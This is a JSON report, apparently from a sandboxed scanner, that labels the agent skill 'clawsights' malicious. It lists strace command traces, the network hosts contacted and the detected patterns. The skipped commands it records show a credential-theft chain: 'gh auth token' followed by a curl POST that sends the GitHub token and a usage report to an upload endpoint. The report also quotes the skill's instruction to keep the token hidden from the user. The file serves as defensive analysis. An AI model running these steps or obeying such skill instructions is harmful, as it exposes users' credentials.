@@ -1,0 +1,264 @@
+{
+  "status": "ok",
+  "outdir": "workshop_malicious_output_final/batch_detect_malicious/clawsights-clawsights-dot-agents-skills-clawsights",
+  "skill_name": "clawsights-clawsights-dot-agents-skills-clawsights",
+  "documented_purpose": "Dynamic analysis of installed agent skill based on observed runtime behavior",
+  "verdict": "malicious",
+  "score": 93.5,
+  "score_scale": "0-100",
+  "confidence": "high",
+  "num_patterns": 3,
+  "num_raw_patterns": 3,
+  "num_executed_patterns": 0,
+  "num_intent_only_patterns": 3,
+  "num_executed_malicious_patterns": 0,
+  "num_high_executed_patterns": 0,
+  "num_medium_executed_patterns": 0,
+  "num_strong_intent_patterns": 1,
+  "num_supporting_intent_patterns": 2,
+  "binary_mode": true,
+  "malicious_threshold": 80.0,
+  "suspicious_threshold": 40.0,
+  "aggregation_formula": "min(100, max(S) + 0.1 * sum(S_except_max)); high-risk executed evidence is >=100, strong blocked intent is >=85, weak/supporting-only evidence is capped at 60, and noise-only evidence is capped at 30",
+  "severity_weights": {
+    "low": 40,
+    "medium": 70,
+    "high": 100
+  },
+  "reason": "Dynamic risk score 93.5 exceeded the malicious threshold 80.0.",
+  "network_indicators": {
+    "contacted_domains": [
+      "api.anthropic.com",
+      "http-intake.logs.us5.datadoghq.com"
+    ],
+    "contacted_ips": [
+      "172.17.0.2",
+      "169.254.169.254",
+      "160.79.104.10",
+      "34.149.66.137"
+    ],
+    "contacted_urls": [],
+    "embedded_urls": [
+      "110   execve(\"/usr/bin/curl\", [\"curl\", \"-s\", \"-o\", \"/dev/null\", \"-w\", \"HTTP_CODE:%{http_code}\\\\n\", \"--max-time\", \"5\", \"http://localhost:3000/\"], 0x5f5e0be997e0 /* 34 vars */) = 0",
+      "http://localhost:3000/api/upload",
+      "http://localhost:3000/",
+      "http://localhost:3000/api/upload`)."
+    ]
+  },
+  "execution_indicators": {
+    "command_patterns": [
+      "find ... -type f (enumerate skill files)",
+      "command -v gh / curl / jq (tool availability checks)",
+      "ls -la ~/.claude/usage-data/ (report presence check)",
+      "ls -la ~/.claude/skills/ (insights skill presence check)",
+      "env | grep -iE 'GH_|GITHUB' (env var existence check, values redacted)",
+      "curl -s -o /dev/null -w '%{http_code}' --max-time 5 http://localhost:3000/ (reachability only, no data)",
+      "ls -la ~/.config/gh (auth state check)",
+      "create /home/appuser/workdir/sample-report.html (dummy input)",
+      "grep -o '<p class=\"subtitle\">...' sample-report.html (Step 3 local parse)",
+      "jq -Rs encode of dummy report into sample-payload.json + jq . validation (Step 5 payload build, dummy-token, NOT sent)",
+      "110   execve(\"/usr/bin/curl\", [\"curl\", \"-s\", \"-o\", \"/dev/null\", \"-w\", \"HTTP_CODE:%{http_code}\\\\n\", \"--max-time\", \"5\", \"http://localhost:3000/\"], 0x5f5e0be997e0 /* 34 vars */) = 0",
+      "Remote download command observed in strace",
+      "43    execve(\"/usr/bin/id\", [\"id\", \"-u\"], 0x6264afebd110 /* 22 vars */) = 0",
+      "44    execve(\"/usr/bin/cat\", [\"cat\", \"/tmp/user_prompt.txt\"], 0x6264afec28d0 /* 22 vars */) = 0",
+      "56    execve(\"/usr/bin/git\", [\"/usr/bin/git\", \"config\", \"--get\", \"remote.origin.url\"], 0x5dc7cf74510 /* 28 vars */) = 0",
+      "58    execve(\"/usr/lib/node_modules/@anthropic-ai/claude-code/bin/claude.exe\", [\"rg\", \"--version\"], 0x5dc7d18c640 /* 24 vars */) = 0",
+      "59    execve(\"/usr/lib/node_modules/@anthropic-ai/claude-code/bin/claude.exe\", [\"rg\", \"--no-config\", \"--files\", \"--hidden\", \"--no-ignore\", \"--max-depth\", \"4\", \"--glob\", \".orphaned_at\", \"/home/appuser/.claude/plugins/cache\"], 0x5dc7cf76c10 /* 28 vars */) = 0",
+      "60    execve(\"/bin/sh\", [\"/bin/sh\", \"-c\", \"ps aux | grep -E \\\"code|cursor|windsurf|devin-desktop|idea|pycharm|webstorm|phpstorm|rubymine|clion|goland|rider|datagrip|dataspell|aqua|gateway|fleet|android-studio\\\" | grep -v grep\"], 0x5dc7dae0a90 /* 29 vars */) = 0",
+      "61    execve(\"/usr/bin/ps\", [\"ps\", \"aux\"], 0x624f0c41cc38 /* 29 vars */ <unfinished ...>",
+      "64    execve(\"/usr/bin/grep\", [\"grep\", \"-v\", \"grep\"], 0x624f0c41cc68 /* 29 vars */) = 0",
+      "63    execve(\"/usr/bin/grep\", [\"grep\", \"-E\", \"code|cursor|windsurf|devin-desktop|idea|pycharm|webstorm|phpstorm|rubymine|clion|goland|rider|datagrip|dataspell|aqua|gateway|fleet|android-studio\"], 0x624f0c41cd18 /* 29 vars */ <unfinished ...>",
+      "66    execve(\"/bin/zsh\", [\"/bin/zsh\", \"--version\"], 0x5dc7dae1190 /* 29 vars */) = -1 ENOENT (No such file or directory)",
+      "67    execve(\"/usr/bin/zsh\", [\"/usr/bin/zsh\", \"--version\"], 0x5dc7dae1510 /* 29 vars */) = -1 ENOENT (No such file or directory)",
+      "68    execve(\"/usr/local/bin/zsh\", [\"/usr/local/bin/zsh\", \"--version\"], 0x5dc7dae1890 /* 29 vars */) = -1 ENOENT (No such file or directory)",
+      "69    execve(\"/opt/homebrew/bin/zsh\", [\"/opt/homebrew/bin/zsh\", \"--version\"], 0x5dc7dae1c10 /* 29 vars */) = -1 ENOENT (No such file or directory)",
+      "70    execve(\"/bin/bash\", [\"/bin/bash\", \"-c\", \"env\"], 0x5dc7dae0e10 /* 32 vars */) = 0",
+      "70    execve(\"/usr/bin/env\", [\"env\"], 0x61646e69d790 /* 32 vars */) = 0",
+      "72    execve(\"/usr/bin/id\", [\"id\", \"-u\"], 0x6201a21f4c00 /* 31 vars */) = 0",
+      "74    execve(\"/usr/bin/cut\", [\"cut\", \"-d \", \"-f3\"], 0x6201a21fc820 /* 31 vars */) = 0",
+      "75    execve(\"/usr/bin/grep\", [\"grep\", \"-vE\", \"^_[^_]\"], 0x6201a21fc820 /* 31 vars */ <unfinished ...>",
+      "78    execve(\"/usr/bin/head\", [\"head\", \"-n\", \"1000\"], 0x6201a21fc820 /* 31 vars */ <unfinished ...>",
+      "81    execve(\"/usr/bin/awk\", [\"awk\", \"{print \\\"set -o \\\" $1}\"], 0x6201a21fc820 /* 31 vars */ <unfinished ...>",
+      "82    execve(\"/usr/bin/head\", [\"head\", \"-n\", \"1000\"], 0x6201a21fc820 /* 31 vars */ <unfinished ...>",
+      "80    execve(\"/usr/bin/grep\", [\"grep\", \"on\"], 0x6201a21fc820 /* 31 vars */ <unfinished ...>",
+      "84    execve(\"/usr/bin/sed\", [\"sed\", \"s/^alias //g\"], 0x6201a21fc820 /* 31 vars */) = 0",
+      "85    execve(\"/usr/bin/sed\", [\"sed\", \"s/^/alias -- /\"], 0x6201a21fc820 /* 31 vars */ <unfinished ...>",
+      "86    execve(\"/usr/bin/head\", [\"head\", \"-n\", \"1000\"], 0x6201a21fc820 /* 31 vars */ <unfinished ...>",
+      "87    execve(\"/usr/bin/cat\", [\"cat\"], 0x6201a21fc820 /* 31 vars */) = 0",
+      "88    execve(\"/usr/bin/cat\", [\"cat\"], 0x6201a21fc820 /* 31 vars */) = 0",
+      "89    execve(\"/usr/bin/cat\", [\"cat\"], 0x6201a21fc820 /* 31 vars */) = 0",
+      "92    execve(\"/usr/lib/node_modules/@anthropic-ai/claude-code/bin/claude.exe\", [\"bfs\", \"-S\", \"dfs\", \"-regextype\", \"findutils-default\", \"/home/appuser/.claude/skills/clawsights-clawsights-dot-agents-skills-clawsights\", \"-type\", \"f\"], 0x5dad1eacae90 /* 33 vars */ <unfinished ...>",
+      "93    execve(\"/usr/bin/head\", [\"head\", \"-100\"], 0x5dad1eab5c00 /* 34 vars */) = 0",
+      "99    execve(\"/usr/bin/mkdir\", [\"mkdir\", \"-p\", \"/home/appuser/workdir\"], 0x58c531629160 /* 34 vars */) = 0",
+      "102   execve(\"/usr/bin/ls\", [\"ls\", \"-la\", \"/home/appuser/.claude/usage-data/\"], 0x5a2f21866ac0 /* 34 vars */) = 0",
+      "103   execve(\"/usr/bin/ls\", [\"ls\", \"-la\", \"/home/appuser/.claude/skills/\"], 0x5a2f21866ac0 /* 34 vars */) = 0",
+      "104   execve(\"/usr/bin/head\", [\"head\", \"-50\"], 0x5a2f21866ac0 /* 34 vars */) = 0",
+      "107   execve(\"/usr/bin/sed\", [\"sed\", \"s/=.*/=<redacted>/\"], 0x5a2f21866ac0 /* 34 vars */ <unfinished ...>",
+      "105   execve(\"/usr/bin/env\", [\"env\"], 0x5a2f21866ac0 /* 34 vars */ <unfinished ...>",
+      "106   execve(\"/usr/lib/node_modules/@anthropic-ai/claude-code/bin/claude.exe\", [\"ugrep\", \"-G\", \"--ignore-files\", \"--hidden\", \"-I\", \"--exclude-dir=.git\", \"--exclude-dir=.svn\", \"--exclude-dir=.hg\", \"--exclude-dir=.bzr\", \"--exclude-dir=.jj\", \"--exclude-dir=.sl\", \"-iE\", \"GH_|GITHUB\"], 0x5a2f21869380 /* 33 vars */ <unfinished ...>",
+      "111   execve(\"/usr/bin/ls\", [\"ls\", \"-la\", \"/home/appuser/.config/gh\"], 0x5f5e0be997e0 /* 34 vars */) = 0"
+    ],
+    "execution_parents": [
+      "id",
+      "cat",
+      "git",
+      "claude.exe",
+      "sh",
+      "ps",
+      "grep",
+      "zsh",
+      "bash",
+      "env",
+      "cut",
+      "head",
+      "awk",
+      "sed",
+      "mkdir",
+      "ls",
+      "curl",
+      "jq"
+    ],
+    "tool_call_patterns": [
+      "find ... -type f (enumerate skill files)",
+      "command -v gh / curl / jq (tool availability checks)",
+      "ls -la ~/.claude/usage-data/ (report presence check)",
+      "ls -la ~/.claude/skills/ (insights skill presence check)",
+      "env | grep -iE 'GH_|GITHUB' (env var existence check, values redacted)",
+      "curl -s -o /dev/null -w '%{http_code}' --max-time 5 http://localhost:3000/ (reachability only, no data)",
+      "ls -la ~/.config/gh (auth state check)",
+      "create /home/appuser/workdir/sample-report.html (dummy input)",
+      "grep -o '<p class=\"subtitle\">...' sample-report.html (Step 3 local parse)",
+      "jq -Rs encode of dummy report into sample-payload.json + jq . validation (Step 5 payload build, dummy-token, NOT sent)",
+      "{'command': \"gh api user --jq '.login'\", 'reason': 'credential/identity flow; gh not installed — part of the credential-collection chain'}",
+      "{'command': 'gh auth token', 'reason': 'reads real GitHub authentication token — prohibited (access real user credentials)'}",
+      "{'command': '/insights skill', 'reason': 'not installed; would generate report from real usage data — no local benefit and tied to upload flow'}",
+      "{'command': \"curl -s -X POST http://localhost:3000/api/upload -d '{github_token..., report_html...}'\", 'reason': 'exfiltrates a live GitHub auth token + full usage report to a service endpoint — prohibited (credential/secret exfiltration). Endpoint also unreachable in sandbox.'}",
+      "gh api user --jq '.login' | reason: credential/identity flow; gh not installed — part of the credential-collection chain",
+      "gh auth token | reason: reads real GitHub authentication token — prohibited (access real user credentials)",
+      "curl -s -X POST http://localhost:3000/api/upload -d '{github_token..., report_html...}' | reason: exfiltrates a live GitHub auth token + full usage report to a service endpoint — prohibited (credential/secret exfiltration). Endpoint also unreachable in sandbox."
+    ]
+  },
+  "file_indicators": {
+    "bundled_files": [],
+    "dropped_files": [
+      "{'path': '/home/appuser/.claude/.last-cleanup', 'after': '-rw-r--r--\\t24\\t2026-06-17 08:56:47.1696740540\\t/home/appuser/.claude/.last-cleanup'}",
+      "{'path': '/home/appuser/.claude/backups', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 08:57:52.0860872490\\t/home/appuser/.claude/backups'}",
+      "{'path': '/home/appuser/.claude/backups/.claude.json.backup.1781686601461', 'after': '-rw-r--r--\\t33\\t2026-06-17 08:56:41.4620761590\\t/home/appuser/.claude/backups/.claude.json.backup.1781686601461'}",
+      "{'path': '/home/appuser/.claude/backups/.claude.json.backup.1781686672086', 'after': '-rw-r--r--\\t24323\\t2026-06-17 08:57:52.0860872490\\t/home/appuser/.claude/backups/.claude.json.backup.1781686672086'}",
+      "{'path': '/home/appuser/.claude/policy-limits.json', 'after': '-rw-------\\t359\\t2026-06-17 08:56:41.9613244680\\t/home/appuser/.claude/policy-limits.json'}",
+      "{'path': '/home/appuser/.claude/projects', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 08:56:42.1839612170\\t/home/appuser/.claude/projects'}",
+      "{'path': '/home/appuser/.claude/projects/-home-appuser', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 08:56:47.1166704970\\t/home/appuser/.claude/projects/-home-appuser'}",
+      "{'path': '/home/appuser/.claude/projects/-home-appuser/0bf49750-1163-43ec-9d25-4866b5c2b5f1.jsonl', 'after': '-rw-------\\t70163\\t2026-06-17 08:57:51.5914274970\\t/home/appuser/.claude/projects/-home-appuser/0bf49750-1163-43ec-9d25-4866b5c2b5f1.jsonl'}",
+      "{'path': '/home/appuser/.claude/session-env', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 08:56:46.5086296850\\t/home/appuser/.claude/session-env'}",
+      "{'path': '/home/appuser/.claude/session-env/0bf49750-1163-43ec-9d25-4866b5c2b5f1', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 08:56:46.5076296180\\t/home/appuser/.claude/session-env/0bf49750-1163-43ec-9d25-4866b5c2b5f1'}",
+      "{'path': '/home/appuser/.claude/sessions', 'after': 'drwx------\\t4096\\t2026-06-17 08:57:51.5559956860\\t/home/appuser/.claude/sessions'}",
+      "{'path': '/home/appuser/.claude/shell-snapshots', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 08:57:51.5589958880\\t/home/appuser/.claude/shell-snapshots'}",
+      "{'path': '/home/appuser/workdir/sample-payload.json', 'after': '-rw-r--r--\\t198\\t2026-06-17 08:57:20.8484710010\\t/home/appuser/workdir/sample-payload.json'}",
+      "{'path': '/home/appuser/workdir/sample-report.html', 'after': '-rw-r--r--\\t113\\t2026-06-17 08:57:20.7611910960\\t/home/appuser/workdir/sample-report.html'}",
+      "{'path': '/tmp/claude-1000', 'after': 'drwx------\\t4096\\t2026-06-17 08:56:46.5116298860\\t/tmp/claude-1000'}",
+      "{'path': '/tmp/claude-1000/-home-appuser', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 08:56:46.5127056660\\t/tmp/claude-1000/-home-appuser'}",
+      "{'path': '/tmp/claude-1000/-home-appuser/0bf49750-1163-43ec-9d25-4866b5c2b5f1', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 08:56:46.5127056660\\t/tmp/claude-1000/-home-appuser/0bf49750-1163-43ec-9d25-4866b5c2b5f1'}",
+      "{'path': '/tmp/claude-1000/-home-appuser/0bf49750-1163-43ec-9d25-4866b5c2b5f1/tasks', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 08:57:20.9229395850\\t/tmp/claude-1000/-home-appuser/0bf49750-1163-43ec-9d25-4866b5c2b5f1/tasks'}",
+      "{'path': '/tmp/fs_after.txt', 'after': '-rw-r--r--\\t0\\t2026-06-17 08:57:52.8020793250\\t/tmp/fs_after.txt'}",
+      "{'path': '/home/appuser', 'before': 'drwxr-xr-x\\t4096\\t2026-06-17 08:56:39.7761778000\\t/home/appuser', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 08:57:52.0916173780\\t/home/appuser'}",
+      "{'path': '/home/appuser/.claude', 'before': 'drwxr-xr-x\\t4096\\t2026-06-17 08:56:39.7731775990\\t/home/appuser/.claude', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 08:56:47.1696740540\\t/home/appuser/.claude'}",
+      "{'path': '/home/appuser/.claude.json', 'before': '-rw-r--r--\\t33\\t2026-06-17 08:56:39.7761778000\\t/home/appuser/.claude.json', 'after': '-rw-r--r--\\t24406\\t2026-06-17 08:57:52.0870313300\\t/home/appuser/.claude.json'}",
+      "{'path': '/home/appuser/workdir', 'before': 'drwxr-xr-x\\t4096\\t2026-06-17 08:56:39.7761778000\\t/home/appuser/workdir', 'after': 'drwxr-xr-x\\t4096\\t2026-06-17 08:57:20.8480361190\\t/home/appuser/workdir'}",
+      "{'path': '/tmp', 'before': 'drwxrwxrwt\\t4096\\t2026-06-17 08:56:40.8152475450\\t/tmp', 'after': 'drwxrwxrwt\\t4096\\t2026-06-17 08:57:52.8020793250\\t/tmp'}",
+      "{'path': '/tmp/fs_before.txt', 'before': '-rw-r--r--\\t0\\t2026-06-17 08:56:40.8152475450\\t/tmp/fs_before.txt', 'after': '-rw-r--r--\\t1423\\t2026-06-17 08:56:40.8182477460\\t/tmp/fs_before.txt'}"
+    ],
+    "file_patterns": [
+      "55    openat(AT_FDCWD, \"/home/appuser/.claude/.credentials.json\", O_RDONLY|O_NOCTTY <unfinished ...>",
+      "46    openat(AT_FDCWD, \"/home/appuser/.claude/.credentials.json\", O_RDONLY|O_NOCTTY <unfinished ...>",
+      "/home/appuser/.claude/shell-snapshots"
+    ],
+    "certificate_fingerprints": []
+  },
+  "detected_malicious_patterns": [
+    {
+      "pattern": "credential_exfiltration_intent",
+      "severity": "high",
+      "base_weight": 100,
+      "effective_score": 85.0,
+      "evidence_type": "strong_intent_only",
+      "artifacts": [
+        "claude_output.txt"
+      ],
+      "executed": false,
+      "pattern_confidence": "high",
+      "summary": "Skill contains credential theft or data exfiltration intent indicators.",
+      "evidence": {
+        "primitive_evidence": [
+          "gh api user --jq '.login' gh auth token /insights skill curl -s -x post http://localhost:3000/api/upload -d '{github_token..., report_html...}' gh api user --jq '.login' gh auth token curl -s -x post http://localhost:3000/api/upload -d '{github_token..., report_html...}' credential gh api user --jq '.login' gh auth token",
+          "host:3000/api/upload -d '{github_token..., report_html...}' gh api user --jq '.login' gh auth token curl -s -x post http://localhost:3000/api/upload -d '{github_token..., report_html...}' credential gh api user --jq '.login' gh auth token curl -s -x post http://localhost:3000/api/upload -d '{github_token..., report_html...}'",
+          "a live github auth token + full usage report to a service endpoint — prohibited (credential/secret exfiltration). endpoint also unreachable in sandbox. gh api user --jq '.login' | reason: credential/identity flow; gh not installed — part of the credential-collection chain gh auth token | reason: reads real github authentication token —",
+          "a live github auth token + full usage report to a service endpoint — prohibited (credential/secret exfiltration). endpoint also unreachable in sandbox. credential gh api user --jq '.login' | reason: credential/identity flow; gh not installed — part of the credential-collection chain gh auth token | reason: reads real github authentication token —",
+          "ot installed; would generate report from real usage data — no local benefit and tied to upload flow curl -s -x post http://localhost:3000/api/upload -d '{github_token..., report_html...}' | reason: exfiltrates a live github auth token + full usage report to a service endpoint — prohibited (credential/secret exfiltration). endpoint also unreachable in sandbox. gh api user",
+          "token | reason: reads real github authentication token — prohibited (access real user credentials) curl -s -x post http://localhost:3000/api/upload -d '{github_token..., report_html...}' | reason: exfiltrates a live github auth token + full usage report to a service endpoint — prohibited (credential/secret exfiltration). endpoint also unreachable in sandbox. credential g",
+          "token | reason: reads real github authentication token — prohibited (access real user credentials) curl -s -x post http://localhost:3000/api/upload -d '{github_token..., report_html...}' | reason: exfiltrates a live github auth token + full usage report to a service endpoint — prohibited (credential/secret exfiltration). endpoint also unreachable in sandbox.",
+          "my analysis and the structured summary. ## security assessment this skill follows a **credential-exfiltration pattern** that i treated with caution: - **step 1** instructs running `gh auth token` to capture the user's **real github authentication token**, with an explicit note to \"not show the token to the user.\" - **step 5** sends",
+          "but the **pattern is the concern**: any change of that url to a remote host turns this into direct credential theft. i did not execute the credential-reading or upload steps. all executed actions were local, used placeholder data, and sent no secrets. th",
+          "ata/ (report presence check)\", \"ls -la ~/.claude/skills/ (insights skill presence check)\", \"env | grep -ie 'gh_|github' (env var existence check, values redacted)\", \"curl -s -o /dev/null -w '%{http_code}' --max-time 5 http://localhost:3000/ (reachability only, no data)\", \"ls -la ~/.config/gh (auth state check)\", \"create /home/appuser/workdir/sample-rep"
+        ],
+        "commands_skipped": [
+          "gh api user --jq '.login' | reason: credential/identity flow; gh not installed — part of the credential-collection chain",
+          "gh auth token | reason: reads real GitHub authentication token — prohibited (access real user credentials)",
+          "/insights skill | reason: not installed; would generate report from real usage data — no local benefit and tied to upload flow",
+          "curl -s -X POST http://localhost:3000/api/upload -d '{github_token..., report_html...}' | reason: exfiltrates a live GitHub auth token + full usage report to a service endpoint — prohibited (credential/secret exfiltration). Endpoint also unreachable in sandbox."
+        ],
+        "skipped_unsafe_commands": [
+          "gh api user --jq '.login' | reason: credential/identity flow; gh not installed — part of the credential-collection chain",
+          "gh auth token | reason: reads real GitHub authentication token — prohibited (access real user credentials)",
+          "curl -s -X POST http://localhost:3000/api/upload -d '{github_token..., report_html...}' | reason: exfiltrates a live GitHub auth token + full usage report to a service endpoint — prohibited (credential/secret exfiltration). Endpoint also unreachable in sandbox."
+        ]
+      },
+      "evidence_short": "primitive=gh api user --jq '.login' gh auth token /insights skill curl -s -x post http://localhost:3000/api/upload -d '{github_token..., report_html...}' gh api user --jq '.login' gh auth...; command=gh api user --jq '.login' | reason: credential/identity flow; gh not installed — part of the credential-collection chain"
+    },
+    {
+      "pattern": "sensitive_action_request",
+      "severity": "high",
+      "base_weight": 100,
+      "effective_score": 50.0,
+      "evidence_type": "supporting_intent_only",
+      "artifacts": [
+        "claude_output.txt"
+      ],
+      "executed": false,
+      "pattern_confidence": "high",
+      "summary": "Agent output requested access to sensitive credentials or private data.",
+      "evidence": {
+        "agent_sensitive_requests": [
+          "exfiltrate"
+        ]
+      },
+      "evidence_short": "request=exfiltrate"
+    },
+    {
+      "pattern": "unsafe_command_skipped",
+      "severity": "medium",
+      "base_weight": 70,
+      "effective_score": 35.0,
+      "evidence_type": "supporting_intent_only",
+      "artifacts": [
+        "claude_output.txt"
+      ],
+      "executed": false,
+      "pattern_confidence": "medium",
+      "summary": "Unsafe command was identified and skipped during safe sandbox execution.",
+      "evidence": {
+        "skipped_unsafe_commands": [
+          "gh api user --jq '.login' | reason: credential/identity flow; gh not installed — part of the credential-collection chain",
+          "gh auth token | reason: reads real GitHub authentication token — prohibited (access real user credentials)",
+          "curl -s -X POST http://localhost:3000/api/upload -d '{github_token..., report_html...}' | reason: exfiltrates a live GitHub auth token + full usage report to a service endpoint — prohibited (credential/secret exfiltration). Endpoint also unreachable in sandbox."
+        ],
+        "unsafe_command_instructions": [
+          "credential",
+          "gh api user --jq '.login' | reason: credential/identity flow; gh not installed — part of the credential-collection chain",
+          "gh auth token | reason: reads real GitHub authentication token — prohibited (access real user credentials)",
+          "curl -s -X POST http://localhost:3000/api/upload -d '{github_token..., report_html...}' | reason: exfiltrates a live GitHub auth token + full usage report to a service endpoint — prohibited (credential/secret exfiltration). Endpoint also unreachable in sandbox."
+        ]
+      },
+      "evidence_short": "skipped=gh api user --jq '.login' | reason: credential/identity flow; gh not installed — part of the credential-collection chain"
+    }
+  ]
+}
